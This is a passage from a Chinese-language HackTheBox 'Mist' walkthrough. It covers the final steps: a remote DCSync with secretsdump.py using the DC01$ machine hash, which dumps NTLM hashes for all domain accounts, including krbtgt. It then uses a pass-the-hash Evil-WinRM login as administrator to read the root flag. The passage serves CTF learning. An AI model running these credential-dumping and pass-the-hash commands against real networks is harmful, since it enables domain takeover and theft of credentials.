 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.
 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....
 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.
 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1
NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
[*] Cleaning up...
```

#### 二次secretsdump

这些本地哈希值不足以在系统上进行远程登录。然而，DC01$的system hash可以请求hash，因为它使用DCSync协议，而DCSync协议不是远程登录。这意味着可以使用machine hash执行远程secretsdump.py：

``` bash
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260

~/hackthebox/machine/mist proxychains -q secretsdump.py 'DC01$@DC01' -hashes :e768c4cf883a87ba9e96278990292260 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
MS01$:1108:aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4:::
svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:07bb1cde74ed154fcec836bc1122bdcc:::
[*] Cleaning up...
```

#### DC01 administrator Shell

``` bash
~/hackthebox/machine/mist proxychains -q evil-winrm -i DC01 -u administrator -H b46782b9365344abdff1a925601e0385

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mist\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\desktop\root.txt
f8421360aaef98e99fa81ea80fb4a2ca
```

<!-- kb:end mist -->

</details>

